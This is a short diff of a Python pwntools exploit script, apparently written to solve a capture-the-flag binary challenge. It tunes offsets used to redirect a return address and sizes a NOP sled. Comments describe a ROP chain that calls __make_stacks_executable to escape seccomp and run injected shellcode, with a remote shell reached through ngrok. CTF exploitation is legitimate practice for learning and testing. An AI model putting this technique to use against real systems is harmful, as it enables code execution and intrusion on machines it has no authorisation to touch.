@@ -53,7 +53,7 @@ log.info('Shellcode len: ' + hex(len(asm(shellcode))))
 
 #thread stack is at fixed offset to libc, change return address to thread stack
 
-add(19, (0x10 * 8 + 0x100) - (libc_off + strt_off + 243), False)
+add(19, (0x10 * 8 + 0x80) - (libc_off + strt_off + 243), False)
 
 #create rop feng shui chain to call __make_stacks_executable then return pthread_exit
 
@@ -70,7 +70,7 @@ add(buf_off + 258, (libp_off + stkexec_off + 32) - (libc_off + nlglolo_off)) #id
 #add shell code while also calling rop chain which eventually runs shellcode without seccomp
 #use this to connect to shell with ngrok
 #gdb.attach(p)
-p.sendlineafter('(y/N)', b'\x90' * 0x200 + asm(shellcode))
+p.sendlineafter('(y/N)', b'\x90' * 0x100 + asm(shellcode))
 
 #pray for flag
 
